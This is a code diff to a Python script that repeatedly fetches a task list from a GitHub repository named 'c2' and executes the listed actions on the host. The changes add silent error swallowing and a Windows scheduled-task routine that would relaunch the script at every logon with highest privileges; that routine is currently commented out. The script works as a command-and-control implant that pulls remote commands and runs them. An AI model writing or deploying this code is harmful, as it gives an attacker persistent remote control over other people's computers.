@@ -3,9 +3,14 @@ import time
 import os
 import platform
 
-URL = "https://raw.githubusercontent.com/eduardo-cortes-dev/c2/main/tasks.json"
+URL = "https://raw.githubusercontent.com/eduardo-cortes-dev/c2/main/c2.json"
+INTERVAL = 10
 TASK_HISTORY = []
-INTERVAL = 3
+PATH = os.path.abspath(__file__)
+NAME = os.path.splitext(os.path.basename(PATH))[0]
+
+def create_startup_task():
+    os.system(f'schtasks /Create /SC ONLOGON /TN {NAME} /TR "python \\"{PATH}\\"" /RL HIGHEST')
 
 def get_tasks():
     response = requests.get(URL)
@@ -35,18 +40,22 @@ def execute_action(type, args):
 
 def main():
     while True:
-        tasks = get_tasks()
-        
-        for task in tasks:
-            if not validate_time(task["valid_until"]): continue
-            if not validate_target(task["target"]): continue
-            if not valid_history(task["id"], task["valid_until"]): continue
-            
-            for action in task["actions"]:
-                execute_action(action["type"], action["args"])
+        try:
+            tasks = get_tasks()
 
-        time.sleep(INTERVAL)
+            for task in tasks:
+                if not validate_time(task["valid_until"]): continue
+                if not validate_target(task["target"]): continue
+                if not valid_history(task["id"], task["valid_until"]): continue
+
+                for action in task["actions"]:
+                    execute_action(action["type"], action["args"])
+
+            time.sleep(INTERVAL)
+        except: pass
 
 if __name__ == "__main__":
-    try: main()
+    try:
+        #create_startup_task()
+        main()
     except: pass
